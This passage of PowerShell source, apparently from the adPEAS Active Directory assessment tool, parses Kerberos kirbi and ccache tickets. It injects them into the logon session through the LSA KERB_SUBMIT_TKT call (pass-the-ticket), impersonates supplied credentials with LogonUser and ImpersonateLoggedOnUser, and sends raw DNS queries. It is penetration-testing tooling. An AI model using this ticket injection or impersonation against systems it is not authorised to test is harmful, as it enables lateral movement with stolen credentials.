	                        $lenInfo = Read-ASN1Length -bytes $Data -offset $encDataPos
	                        $encDataPos += $lenInfo.BytesConsumed
	                        $encPartEtype = 0
	                        if ($Data[$encDataPos] -eq 0xA0) {
	                            $encDataPos++
	                            $lenInfo = Read-ASN1Length -bytes $Data -offset $encDataPos
	                            $encDataPos += $lenInfo.BytesConsumed
	                            $intResult = Read-ASN1Integer -bytes $Data -offset $encDataPos
	                            $encPartEtype = $intResult.Value
	                        }
	                        if ($encPartEtype -eq 0) {
	                            $cipherStart = $elemStart
	                            $cipherEnd = $elemStart + $elemLen
	                            for ($searchPos = $cipherStart; $searchPos -lt $cipherEnd - 20; $searchPos++) {
	                                if ($Data[$searchPos] -eq 0x7D) {  # APPLICATION 29
	                                    $credPartPos = $searchPos + 1
	                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $credPartPos
	                                    $credPartPos += $lenInfo.BytesConsumed
	                                    $credPartEnd = $credPartPos + $lenInfo.Length
	                                    for ($i = $credPartPos; $i -lt $credPartEnd - 10; $i++) {
	                                        if ($Data[$i] -eq 0xA1) {
	                                            $tempPos = $i + 1
	                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
	                                            $tempPos += $lenInfo.BytesConsumed
	                                            if ($Data[$tempPos] -eq 0x1B) {
	                                                $tempPos++
	                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
	                                                $tempPos += $lenInfo.BytesConsumed
	                                                if ($lenInfo.Length -gt 0 -and $lenInfo.Length -lt 100) {
	                                                    $realm = Read-GeneralString -bytes $Data -offset $tempPos -length $lenInfo.Length
	                                                    if ($realm -match '^[A-Za-z0-9\.\-]+$') {
	                                                        $result.ClientRealm = $realm
	                                                        break
	                                                    }
	                                                }
	                                            }
	                                        }
	                                    }
	                                    for ($i = $credPartPos; $i -lt $credPartEnd - 15; $i++) {
	                                        if ($Data[$i] -eq 0xA2) {
	                                            $tempPos = $i + 1
	                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
	                                            $tempPos += $lenInfo.BytesConsumed
	                                            if ($Data[$tempPos] -eq 0x30) {
	                                                $tempPos++
	                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
	                                                $tempPos += $lenInfo.BytesConsumed
	                                                $pnameEnd = $tempPos + $lenInfo.Length
	                                                while ($tempPos -lt $pnameEnd) {
	                                                    if ($Data[$tempPos] -eq 0xA1) {
	                                                        $tempPos++
	                                                        $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
	                                                        $tempPos += $lenInfo.BytesConsumed
	                                                        if ($Data[$tempPos] -eq 0x30) {
	                                                            $tempPos++
	                                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
	                                                            $tempPos += $lenInfo.BytesConsumed
	                                                            if ($Data[$tempPos] -eq 0x1B) {
	                                                                $tempPos++
	                                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
	                                                                $tempPos += $lenInfo.BytesConsumed
	                                                                $result.ClientName = Read-GeneralString -bytes $Data -offset $tempPos -length $lenInfo.Length
	                                                            }
	                                                        }
	                                                        break
	                                                    }
	                                                    $tempPos++
	                                                }
	                                                break
	                                            }
	                                        }
	                                    }
	                                    for ($i = $credPartPos; $i -lt $credPartEnd - 20; $i++) {
	                                        $ctxTag = $Data[$i]
	                                        if ($ctxTag -ge 0xA4 -and $ctxTag -le 0xA7) {
	                                            $tempPos = $i + 1
	                                            if ($tempPos -ge $Data.Length) { continue }
	                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
	                                            $tempPos += $lenInfo.BytesConsumed
	                                            if ($tempPos -ge $Data.Length) { continue }
	                                            $timeVal = Read-KerberosTime -bytes $Data -offset $tempPos
	                                            if ($null -ne $timeVal) {
	                                                switch ($ctxTag) {
	                                                    0xA4 { $result.AuthTime = $timeVal; Write-Log "[Parse-KrbCredFile] Found authtime: $timeVal" }
	                                                    0xA5 { $result.StartTime = $timeVal; Write-Log "[Parse-KrbCredFile] Found starttime: $timeVal" }
	                                                    0xA6 { $result.EndTime = $timeVal; Write-Log "[Parse-KrbCredFile] Found endtime: $timeVal" }
	                                                    0xA7 { $result.RenewTill = $timeVal; Write-Log "[Parse-KrbCredFile] Found renew-till: $timeVal" }
	                                                }
	                                            }
	                                        }
	                                    }
	                                    break
	                                }
	                            }
	                        }
	                    }
	                }
	                $pos = $elemStart + $elemLen
	            }
	            if (-not $result.ClientName -and $result.ServerName -match '^krbtgt/') {
	            }
	        }
	        catch {
	        }
	        return $result
	    }
	    if ($Ccache) {
	        $ccacheResult = ConvertFrom-Base64OrFile -InputValue $Ccache -ExpectedFormat "Ccache" -ParameterName "Ccache"
	        if (-not $ccacheResult.Success) {
	            throw "Ccache input error: $($ccacheResult.Error)"
	        }
	        $ccacheBytes = $ccacheResult.Data
	        $ccacheData = Parse-CcacheBytes -Bytes $ccacheBytes
	        $TicketBytes = $ccacheData.Ticket
	        $SessionKey = $ccacheData.SessionKey
	        $SessionKeyType = $ccacheData.SessionKeyType
	        if (-not $Realm) { $Realm = $ccacheData.ClientRealm }
	        if (-not $ClientName) { $ClientName = $ccacheData.ClientName }
	        if (-not $ServerName -and $ccacheData.ServerName -match '^([^/]+)/') {
	            $ServerName = $Matches[1]
	        }
	        if (-not $ServerInstance -and $ccacheData.ServerName -match '/(.+)$') {
	            $ServerInstance = $Matches[1]
	        }
	        $Script:CcacheMetadata = @{
	            UserName = $ccacheData.ClientName
	            Realm = $ccacheData.ClientRealm
	            EncryptionType = $ccacheData.SessionKeyType
	            AuthTime = $ccacheData.AuthTime
	            StartTime = $ccacheData.StartTime
	            EndTime = $ccacheData.EndTime
	            RenewTill = $ccacheData.RenewTill
	        }
	    }
	    elseif ($Kirbi) {
	        $kirbiResult = ConvertFrom-Base64OrFile -InputValue $Kirbi -ExpectedFormat "Kirbi" -ParameterName "Kirbi"
	        if (-not $kirbiResult.Success) {
	            throw "Kirbi input error: $($kirbiResult.Error)"
	        }
	        $TicketBytes = $kirbiResult.Data
	        $kirbiData = Parse-KrbCredFile -Data $TicketBytes
	        if ($kirbiData.ClientName -or $kirbiData.ClientRealm) {
	            $Script:KirbiMetadata = @{
	                UserName = $kirbiData.ClientName
	                Realm = $kirbiData.ClientRealm
	                EncryptionType = $kirbiData.EncryptionType
	                AuthTime = $kirbiData.AuthTime
	                StartTime = $kirbiData.StartTime
	                EndTime = $kirbiData.EndTime
	                RenewTill = $kirbiData.RenewTill
	            }
	            if ($kirbiData.EndTime) {
	            }
	        }
	    }
	    elseif ($TicketBase64) {
	        $TicketBytes = [Convert]::FromBase64String($TicketBase64)
	    }
	    elseif (-not $TicketBytes) {
	        throw "You must provide ticket data via -TicketBytes, -TicketBase64, -Kirbi, or -Ccache"
	    }
	    $firstByte = if ($TicketBytes.Length -gt 0) { $TicketBytes[0] } else { 0 }
	    $isKrbCred = ($firstByte -eq 0x76)
	    $isRawTicket = ($firstByte -eq 0x66 -or $firstByte -eq 0x30 -or $firstByte -eq 0x61)
	    if ($isKrbCred) {
	        $krbCredBytes = $TicketBytes
	    }
	    elseif ($isRawTicket) {
	        $formatName = switch ($firstByte) {
	            0x66 { "APPLICATION 6 (Kerberos Ticket)" }
	            0x30 { "SEQUENCE (raw ticket content)" }
	            0x61 { "APPLICATION 1 (alternate format)" }
	        }
	        if (-not $SessionKey -or $SessionKey.Length -eq 0) {
	            throw "SessionKey is required when importing raw ticket bytes. Please provide the session key from the TGT/TGS response."
	        }
	        $krbCredParams = @{
	            Ticket = $TicketBytes
	            SessionKey = $SessionKey
	            SessionKeyType = $SessionKeyType
	            Realm = $Realm
	            ClientName = $ClientName
	            ServerName = $ServerName
	            ServerInstance = $ServerInstance
	        }
	        if ($AuthTime) { $krbCredParams['AuthTime'] = $AuthTime }
	        if ($StartTime) { $krbCredParams['StartTime'] = $StartTime }
	        if ($EndTime) { $krbCredParams['EndTime'] = $EndTime }
	        if ($RenewTill) { $krbCredParams['RenewTill'] = $RenewTill }
	        if ($TicketFlags) { $krbCredParams['TicketFlags'] = $TicketFlags }
	        $krbCredBytes = Build-KRBCred @krbCredParams
	    }
	    else {
	        $krbCredBytes = $TicketBytes
	    }
	    $TicketBytes = $krbCredBytes
	    $LSACode = @"
using System;
using System.Runtime.InteropServices;
public class LSATicketImport
{
	// Constants
	public const int KERB_SUBMIT_TKT_MESSAGE_TYPE = 21;
	public const int STATUS_SUCCESS = 0;
	// Structures
	[StructLayout(LayoutKind.Sequential)]
	public struct LSA_STRING
	{
	    public ushort Length;
	    public ushort MaximumLength;
	    public IntPtr Buffer;
	}
	[StructLayout(LayoutKind.Sequential)]
	public struct LUID
	{
	    public uint LowPart;
	    public int HighPart;
	}
	// KERB_CRYPTO_KEY32 - uses Offset instead of Pointer (like Rubeus)
	// This is critical: Windows expects offsets relative to buffer start,
	// not pointers which become invalid when buffer is copied to kernel space
	[StructLayout(LayoutKind.Sequential)]
	public struct KERB_CRYPTO_KEY32
	{
	    public int KeyType;
	    public int Length;
	    public int Offset;  // Offset relative to start of KERB_SUBMIT_TKT_REQUEST
	}
	[StructLayout(LayoutKind.Sequential)]
	public struct KERB_SUBMIT_TKT_REQUEST
	{
	    public int MessageType;
	    public LUID LogonId;
	    public int Flags;
	    public KERB_CRYPTO_KEY32 Key;  // Using KERB_CRYPTO_KEY32 with offset
	    public int KerbCredSize;
	    public int KerbCredOffset;
	}
	// P/Invoke declarations
	[DllImport("secur32.dll", SetLastError = true)]
	public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);
	[DllImport("secur32.dll", SetLastError = true)]
	public static extern int LsaLookupAuthenticationPackage(
	    IntPtr LsaHandle,
	    ref LSA_STRING PackageName,
	    out uint AuthenticationPackage
	);
	[DllImport("secur32.dll", SetLastError = true)]
	public static extern int LsaCallAuthenticationPackage(
	    IntPtr LsaHandle,
	    uint AuthenticationPackage,
	    IntPtr ProtocolSubmitBuffer,
	    int SubmitBufferLength,
	    out IntPtr ProtocolReturnBuffer,
	    out int ReturnBufferLength,
	    out int ProtocolStatus
	);
	[DllImport("secur32.dll", SetLastError = true)]
	public static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);
	[DllImport("secur32.dll", SetLastError = true)]
	public static extern int LsaFreeReturnBuffer(IntPtr Buffer);
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern int LsaNtStatusToWinError(int Status);
	// Helper to create LSA_STRING
	public static LSA_STRING CreateLsaString(string s)
	{
	    LSA_STRING lsa = new LSA_STRING();
	    lsa.Length = (ushort)s.Length;
	    lsa.MaximumLength = (ushort)(s.Length + 1);
	    lsa.Buffer = Marshal.StringToHGlobalAnsi(s);
	    return lsa;
	}
}
"@
	    if (-not ([System.Management.Automation.PSTypeName]'LSATicketImport').Type) {
	        try {
	            Add-Type -TypeDefinition $LSACode -ErrorAction Stop
	        } catch {
	            if (-not ([System.Management.Automation.PSTypeName]'LSATicketImport').Type) {
	                throw "Failed to compile LSA P/Invoke code: $_"
	            }
	        }
	    } else {
	    }
	}
	process {
	    $lsaHandle = [IntPtr]::Zero
	    try {
	        if (-not ([System.Management.Automation.PSTypeName]'LSATicketImport').Type) {
	            throw "LSATicketImport type not available. This may require administrator privileges."
	        }
	        $status = [LSATicketImport]::LsaConnectUntrusted([ref]$lsaHandle)
	        if ($status -ne 0) {
	            $winError = [LSATicketImport]::LsaNtStatusToWinError($status)
	            throw "LsaConnectUntrusted failed with NTSTATUS 0x$($status.ToString('X8')) (Win32: $winError)"
	        }
	        $packageName = [LSATicketImport]::CreateLsaString("Kerberos")
	        $authPackage = [uint32]0
	        try {
	            $status = [LSATicketImport]::LsaLookupAuthenticationPackage(
	                $lsaHandle,
	                [ref]$packageName,
	                [ref]$authPackage
	            )
	            if ($status -ne 0) {
	                $winError = [LSATicketImport]::LsaNtStatusToWinError($status)
	                throw "LsaLookupAuthenticationPackage failed with NTSTATUS 0x$($status.ToString('X8')) (Win32: $winError)"
	            }
	        }
	        finally {
	            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($packageName.Buffer)
	        }
	        $structSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][LSATicketImport+KERB_SUBMIT_TKT_REQUEST])
	        $totalSize = $structSize + $TicketBytes.Length
	        $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($totalSize)
	        try {
	            $zeros = New-Object byte[] $totalSize
	            [System.Runtime.InteropServices.Marshal]::Copy($zeros, 0, $buffer, $totalSize)
	            $request = New-Object LSATicketImport+KERB_SUBMIT_TKT_REQUEST
	            $request.MessageType = [LSATicketImport]::KERB_SUBMIT_TKT_MESSAGE_TYPE
	            $request.LogonId.LowPart = [uint32]($LUID -band 0xFFFFFFFF)
	            $request.LogonId.HighPart = [int]($LUID -shr 32)
	            $request.Flags = 0
	            $request.Key.KeyType = 0
	            $request.Key.Length = 0
	            $request.Key.Offset = 0  # Not used when key is embedded in KRB-CRED
	            $request.KerbCredSize = $TicketBytes.Length
	            $request.KerbCredOffset = $structSize
	            [System.Runtime.InteropServices.Marshal]::StructureToPtr($request, $buffer, $false)
	            $ticketPtr = [IntPtr]::Add($buffer, $structSize)
	            [System.Runtime.InteropServices.Marshal]::Copy($TicketBytes, 0, $ticketPtr, $TicketBytes.Length)
	            $returnBuffer = [IntPtr]::Zero
	            $returnLength = 0
	            $protocolStatus = 0
	            $status = [LSATicketImport]::LsaCallAuthenticationPackage(
	                $lsaHandle,
	                $authPackage,
	                $buffer,
	                $totalSize,
	                [ref]$returnBuffer,
	                [ref]$returnLength,
	                [ref]$protocolStatus
	            )
	            if ($returnBuffer -ne [IntPtr]::Zero) {
	                $null = [LSATicketImport]::LsaFreeReturnBuffer($returnBuffer)
	            }
	            if ($status -ne 0) {
	                $winError = [LSATicketImport]::LsaNtStatusToWinError($status)
	                throw "LsaCallAuthenticationPackage failed with NTSTATUS 0x$($status.ToString('X8')) (Win32: $winError)"
	            }
	            if ($protocolStatus -ne 0) {
	                $winError = [LSATicketImport]::LsaNtStatusToWinError($protocolStatus)
	                if ($protocolStatus -eq 0xC000009A -or $winError -eq 1450) {
	                    throw "Ticket import failed (NTSTATUS 0x$($protocolStatus.ToString('X8'))): This typically occurs on non-domain-joined machines or with Remote Credential Guard enabled. SimpleBind fallback will be used."
	                }
	                throw "Kerberos package returned error NTSTATUS 0x$($protocolStatus.ToString('X8')) (Win32: $winError)"
	            }
	            $returnObj = [PSCustomObject]@{
	                Success = $true
	                TicketSize = $TicketBytes.Length
	                LUID = $LUID
	                Message = "Ticket imported successfully"
	                UserName = $null
	                Realm = $null
	                EncryptionType = $null
	                AuthTime = $null
	                StartTime = $null
	                EndTime = $null
	                RenewTill = $null
	            }
	            if ($Script:CcacheMetadata) {
	                $returnObj.UserName = $Script:CcacheMetadata.UserName
	                $returnObj.Realm = $Script:CcacheMetadata.Realm
	                $returnObj.EncryptionType = $Script:CcacheMetadata.EncryptionType
	                $returnObj.AuthTime = $Script:CcacheMetadata.AuthTime
	                $returnObj.StartTime = $Script:CcacheMetadata.StartTime
	                $returnObj.EndTime = $Script:CcacheMetadata.EndTime
	                $returnObj.RenewTill = $Script:CcacheMetadata.RenewTill
	            }
	            elseif ($Script:KirbiMetadata) {
	                $returnObj.UserName = $Script:KirbiMetadata.UserName
	                $returnObj.Realm = $Script:KirbiMetadata.Realm
	                $returnObj.EncryptionType = $Script:KirbiMetadata.EncryptionType
	                $returnObj.AuthTime = $Script:KirbiMetadata.AuthTime
	                $returnObj.StartTime = $Script:KirbiMetadata.StartTime
	                $returnObj.EndTime = $Script:KirbiMetadata.EndTime
	                $returnObj.RenewTill = $Script:KirbiMetadata.RenewTill
	            }
	            elseif ($ClientName -or $Realm) {
	                $returnObj.UserName = $ClientName
	                $returnObj.Realm = $Realm
	                $returnObj.EncryptionType = $SessionKeyType
	            }
	            if ($returnObj.EndTime) {
	                $now = [DateTime]::UtcNow
	                if ($returnObj.EndTime -lt $now) {
	                    $expiredAgo = $now - $returnObj.EndTime
	                    Write-Warning "[Import-KerberosTicket] Ticket is EXPIRED (ended $($expiredAgo.TotalHours.ToString('F1')) hours ago at $($returnObj.EndTime.ToString('u')))"
	                    $returnObj.Message = "Ticket imported but is EXPIRED since $($returnObj.EndTime.ToString('u'))"
	                }
	                elseif (($returnObj.EndTime - $now).TotalMinutes -lt 5) {
	                    Write-Warning "[Import-KerberosTicket] Ticket expires in less than 5 minutes (at $($returnObj.EndTime.ToString('u')))"
	                }
	            }
	            return $returnObj
	        } finally {
	            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
	        }
	    } catch {
	        return [PSCustomObject]@{
	            Success = $false
	            Error = $_.Exception.Message
	            Message = "Failed to import ticket: $_"
	        }
	    } finally {
	        if ($lsaHandle -ne [IntPtr]::Zero) {
	            $null = [LSATicketImport]::LsaDeregisterLogonProcess($lsaHandle)
	        }
	    }
	}
	end {
	}
}
function Invoke-NTLMImpersonation {
	[OutputType([IntPtr])]
	[CmdletBinding(DefaultParameterSetName = 'Credential')]
	param(
	    [Parameter(Mandatory = $true, ParameterSetName = 'Credential')]
	    [Management.Automation.PSCredential]
	    [Management.Automation.CredentialAttribute()]
	    $Credential,
	    [Parameter(Mandatory = $true, ParameterSetName = 'TokenHandle')]
	    [ValidateNotNull()]
	    [IntPtr]
	    $TokenHandle,
	    [Switch]
	    $Quiet
	)
	begin {
	    if (-not ([System.Management.Automation.PSTypeName]'adPEAS.NativeMethods.Impersonation').Type) {
	        $ImpersonationCode = @'
using System;
using System.Runtime.InteropServices;
namespace adPEAS.NativeMethods
{
	public class Impersonation
	{
	    // LogonUser constants
	    public const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
	    public const int LOGON32_PROVIDER_WINNT50 = 3;
	    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
	    public static extern bool LogonUser(
	        string lpszUsername,
	        string lpszDomain,
	        string lpszPassword,
	        int dwLogonType,
	        int dwLogonProvider,
	        out IntPtr phToken);
	    [DllImport("advapi32.dll", SetLastError = true)]
	    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
	    [DllImport("advapi32.dll", SetLastError = true)]
	    public static extern bool RevertToSelf();
	    [DllImport("kernel32.dll", SetLastError = true)]
	    public static extern bool CloseHandle(IntPtr hObject);
	}
}
'@
	        try {
	            Add-Type -TypeDefinition $ImpersonationCode -Language CSharp -ErrorAction Stop
	        }
	        catch {
	            if ($_.Exception.Message -notmatch 'already exists') {
	                throw "[Invoke-NTLMImpersonation] Failed to compile P/Invoke types: $_"
	            }
	        }
	    }
	}
	process {
	    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $Quiet)) {
	        Write-Warning "[Invoke-NTLMImpersonation] PowerShell is not in single-threaded apartment state, token impersonation may not work correctly."
	    }
	    $LogonTokenHandle = [IntPtr]::Zero
	    if ($PSCmdlet.ParameterSetName -eq 'TokenHandle') {
	        $LogonTokenHandle = $TokenHandle
	    }
	    else {
	        $NetworkCredential = $Credential.GetNetworkCredential()
	        $UserDomain = $NetworkCredential.Domain
	        $UserName = $NetworkCredential.UserName
	        if ([string]::IsNullOrEmpty($UserDomain)) {
	            if ($Credential.UserName -match '^([^\\]+)\\(.+)$') {
	                $UserDomain = $Matches[1]
	                $UserName = $Matches[2]
	            }
	            elseif ($Credential.UserName -match '^(.+)@(.+)$') {
	                $UserName = $Matches[1]
	                $UserDomain = $Matches[2]
	            }
	        }
	        $Result = [adPEAS.NativeMethods.Impersonation]::LogonUser(
	            $UserName,
	            $UserDomain,
	            $NetworkCredential.Password,
	            [adPEAS.NativeMethods.Impersonation]::LOGON32_LOGON_NEW_CREDENTIALS,
	            [adPEAS.NativeMethods.Impersonation]::LOGON32_PROVIDER_WINNT50,
	            [ref]$LogonTokenHandle
	        )
	        if (-not $Result) {
	            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
	            $ErrorMessage = (New-Object System.ComponentModel.Win32Exception($LastError)).Message
	            throw "[Invoke-NTLMImpersonation] LogonUser() failed: $ErrorMessage (Error: $LastError)"
	        }
	    }
	    $Result = [adPEAS.NativeMethods.Impersonation]::ImpersonateLoggedOnUser($LogonTokenHandle)
	    if (-not $Result) {
	        $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
	        $ErrorMessage = (New-Object System.ComponentModel.Win32Exception($LastError)).Message
	        if ($LogonTokenHandle -ne [IntPtr]::Zero) {
	            $null = [adPEAS.NativeMethods.Impersonation]::CloseHandle($LogonTokenHandle)
	        }
	        throw "[Invoke-NTLMImpersonation] ImpersonateLoggedOnUser() failed: $ErrorMessage (Error: $LastError)"
	    }
	    return $LogonTokenHandle
	}
}
function Invoke-RevertToSelf {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory = $false)]
	    [IntPtr]
	    $TokenHandle = [IntPtr]::Zero
	)
	process {
	    if ($TokenHandle -ne [IntPtr]::Zero) {
	        $Result = [adPEAS.NativeMethods.Impersonation]::CloseHandle($TokenHandle)
	        if (-not $Result) {
	            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
	            Write-Warning "[Invoke-RevertToSelf] CloseHandle() failed: Error $LastError"
	        }
	    }
	    $Result = [adPEAS.NativeMethods.Impersonation]::RevertToSelf()
	    if (-not $Result) {
	        $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
	        $ErrorMessage = (New-Object System.ComponentModel.Win32Exception($LastError)).Message
	        throw "[Invoke-RevertToSelf] RevertToSelf() failed: $ErrorMessage (Error: $LastError)"
	    }
	}
}
function Invoke-RawDnsQuery {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory = $true)]
	    [string]$Name,
	    [Parameter(Mandatory = $true)]
	    [string]$DnsServer,
	    [Parameter(Mandatory = $false)]
	    [ValidateSet('A', 'SRV')]
	    [string]$Type = 'A',
	    [Parameter(Mandatory = $false)]
	    [int]$Timeout = 5000,
	    [Parameter(Mandatory = $false)]
	    [switch]$ReturnAllSRV
	)
	$udpClient = $null
	try {
	    $transactionId = [byte[]]@(
	        [byte](Get-Random -Minimum 0 -Maximum 256),
	        [byte](Get-Random -Minimum 0 -Maximum 256)
	    )
	    $header = [byte[]]@(
	        $transactionId[0], $transactionId[1],  # Transaction ID
	        0x01, 0x00,                             # Flags: Standard query, RD=1
	        0x00, 0x01,                             # Questions: 1
	        0x00, 0x00,                             # Answer RRs: 0
	        0x00, 0x00,                             # Authority RRs: 0
	        0x00, 0x00                              # Additional RRs: 0
	    )
	    $qname = [System.Collections.Generic.List[byte]]::new()
	    $labels = $Name.Split('.')
	    foreach ($label in $labels) {
	        if ([string]::IsNullOrEmpty($label)) {
	            continue
	        }
	        $labelBytes = [System.Text.Encoding]::ASCII.GetBytes($label)
	        if ($labelBytes.Length -gt 63) {
	            return $null
	        }
	        $qname.Add([byte]$labelBytes.Length)
	        $qname.AddRange($labelBytes)
	    }
	    $qname.Add(0x00)  # Null terminator
	    $qtype = switch ($Type) {
	        'A'   { 1 }
	        'SRV' { 33 }
	    }
	    $question = [byte[]]@(
	        [byte](($qtype -shr 8) -band 0xFF),
	        [byte]($qtype -band 0xFF),
	        0x00, 0x01  # QCLASS IN
	    )
	    $packet = [byte[]]($header + $qname.ToArray() + $question)
	    $udpClient = New-Object System.Net.Sockets.UdpClient
	    $udpClient.Client.ReceiveTimeout = $Timeout
	    $udpClient.Client.SendTimeout = $Timeout
	    $endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($DnsServer), 53)
	    $udpClient.Connect($endpoint)
	    $null = $udpClient.Send($packet, $packet.Length)
	    $remoteEP = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
	    $response = $udpClient.Receive([ref]$remoteEP)
	    if ($response.Length -lt 12) {
	        return $null
	    }
	    if ($response[0] -ne $transactionId[0] -or $response[1] -ne $transactionId[1]) {
	        return $null
	    }
	    $rcode = $response[3] -band 0x0F
	    if ($rcode -ne 0) {
	        return $null
	    }
	    $answerCount = ($response[6] -shl 8) -bor $response[7]
	    if ($answerCount -eq 0) {
	        return $null
	    }
	    $offset = 12
	    while ($offset -lt $response.Length -and $response[$offset] -ne 0) {
	        if (($response[$offset] -band 0xC0) -eq 0xC0) {
	            $offset += 2
	            break
	        }
	        $offset += $response[$offset] + 1
	    }
	    if ($offset -lt $response.Length -and $response[$offset] -eq 0) { $offset++ }
	    $offset += 4
	    $MaxPointerDepth = 10
	    $ReadDnsName = {
	        param([byte[]]$Data, [int]$StartOffset)
	        $name = [System.Collections.Generic.List[string]]::new()
	        $currentOffset = $StartOffset
	        $bytesRead = 0
	        $jumped = $false
	        $pointerDepth = 0
	        $visitedOffsets = [System.Collections.Generic.HashSet[int]]::new()
	        while ($currentOffset -lt $Data.Length) {
	            $labelLen = $Data[$currentOffset]
	            if ($labelLen -eq 0) {
	                if (-not $jumped) { $bytesRead++ }
	                break
	            }
	            if (($labelLen -band 0xC0) -eq 0xC0) {
	                if ($currentOffset + 1 -ge $Data.Length) { break }
	                $pointerDepth++
	                if ($pointerDepth -gt $MaxPointerDepth) {
	                    break
	                }
	                $pointer = (($labelLen -band 0x3F) -shl 8) -bor $Data[$currentOffset + 1]
	                if ($pointer -eq $currentOffset -or $visitedOffsets.Contains($pointer)) {
	                    break
	                }
	                $null = $visitedOffsets.Add($currentOffset)
	                if (-not $jumped) { $bytesRead += 2 }
	                $jumped = $true
	                $currentOffset = $pointer
	                continue
	            }
	            if (-not $jumped) { $bytesRead += $labelLen + 1 }
	            $currentOffset++
	            if ($currentOffset + $labelLen -gt $Data.Length) { break }
	            $label = [System.Text.Encoding]::ASCII.GetString($Data, $currentOffset, $labelLen)
	            $name.Add($label)
	            $currentOffset += $labelLen
	        }
	        return @{
	            Name = $name -join '.'
	            BytesRead = $bytesRead
	        }
	    }
	    $srvRecords = [System.Collections.Generic.List[PSCustomObject]]::new()
	    for ($i = 0; $i -lt $answerCount -and $offset -lt $response.Length; $i++) {
	        if (($response[$offset] -band 0xC0) -eq 0xC0) {
	            $offset += 2  # Compression pointer
	        }
	        else {
	            while ($offset -lt $response.Length -and $response[$offset] -ne 0) {
	                $offset += $response[$offset] + 1
	            }
	            $offset++  # Skip null terminator
	        }
	        if ($offset + 10 -gt $response.Length) { break }
	        $recordType = ($response[$offset] -shl 8) -bor $response[$offset + 1]
	        $offset += 2
	        $offset += 2
	        $offset += 4
	        $rdlength = ($response[$offset] -shl 8) -bor $response[$offset + 1]
	        $offset += 2
	        if ($Type -eq 'A' -and $recordType -eq 1 -and $rdlength -eq 4 -and $offset + 4 -le $response.Length) {
	            $ip = "$($response[$offset]).$($response[$offset + 1]).$($response[$offset + 2]).$($response[$offset + 3])"
	            return $ip
	        }
	        if ($Type -eq 'SRV' -and $recordType -eq 33 -and $rdlength -ge 7 -and $offset + $rdlength -le $response.Length) {
	            $priority = ($response[$offset] -shl 8) -bor $response[$offset + 1]
	            $weight = ($response[$offset + 2] -shl 8) -bor $response[$offset + 3]
	            $port = ($response[$offset + 4] -shl 8) -bor $response[$offset + 5]
	            $targetResult = & $ReadDnsName $response ($offset + 6)
	            $target = $targetResult.Name
	            if ($target) {
	                $srvRecords.Add([PSCustomObject]@{
	                    Priority = $priority
	                    Weight   = $weight
	                    Port     = $port
	                    Target   = $target.TrimEnd('.')
	                })
	            }
	        }
	        $offset += $rdlength
	    }
	    if ($Type -eq 'SRV' -and $srvRecords.Count -gt 0) {
	        $sortedRecords = @($srvRecords | Sort-Object Priority, @{Expression={-$_.Weight}})
	        if ($ReturnAllSRV) {
	            return $sortedRecords
	        }
	        else {
	            $bestRecord = $sortedRecords[0]
	            return $bestRecord
	        }
	    }
	    return $null
	}
	catch {
	    return $null
	}
	finally {
	    if ($udpClient) {
	        $udpClient.Close()
	    }
	}
}
function Resolve-HostnameToIP {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory = $true)]
	    [string]$Hostname,
	    [Parameter(Mandatory = $false)]
	    [string]$DnsServer,
	    [Parameter(Mandatory = $false)]
	    [switch]$NoCache
	)
	$ipAddress = $null
	if ([System.Net.IPAddress]::TryParse($Hostname, [ref]$ipAddress)) {
	    return $Hostname
	}
	if ($Script:LDAPContext -and -not $Script:LDAPContext['DnsCache']) {
	    $Script:LDAPContext['DnsCache'] = [System.Collections.Generic.Dictionary[string,string]]::new([System.StringComparer]::OrdinalIgnoreCase)
	}
	if (-not $NoCache -and $Script:LDAPContext -and $Script:LDAPContext['DnsCache'] -and $Script:LDAPContext['DnsCache'].ContainsKey($Hostname)) {
	    $cachedIP = $Script:LDAPContext['DnsCache'][$Hostname]
	    return $cachedIP
	}
	if ($DnsServer) {
	    try {
	        $DnsResult = Resolve-DnsName -Name $Hostname -Server $DnsServer -Type A -DnsOnly -ErrorAction Stop
	        if ($DnsResult -and $DnsResult.IPAddress) {
	            $ResolvedIP = ($DnsResult | Where-Object { $_.Type -eq 'A' } | Select-Object -First 1).IPAddress
	            if ($ResolvedIP) {
	                if ($Script:LDAPContext -and $Script:LDAPContext['DnsCache']) {
	                    $Script:LDAPContext['DnsCache'][$Hostname] = $ResolvedIP
	                }
	                return $ResolvedIP
	            }
	        }
	    }
	    catch [System.Management.Automation.CommandNotFoundException] {
	    }
	    catch {
	    }
	    try {
	        $UdpResult = Invoke-RawDnsQuery -Name $Hostname -DnsServer $DnsServer -Type A
	        if ($UdpResult) {
	            if ($Script:LDAPContext -and $Script:LDAPContext['DnsCache']) {
	                $Script:LDAPContext['DnsCache'][$Hostname] = $UdpResult
	            }
	            return $UdpResult
	        }
	    }
	    catch {
	    }
	}
	try {
	    $DnsResult = [System.Net.Dns]::GetHostEntry($Hostname)
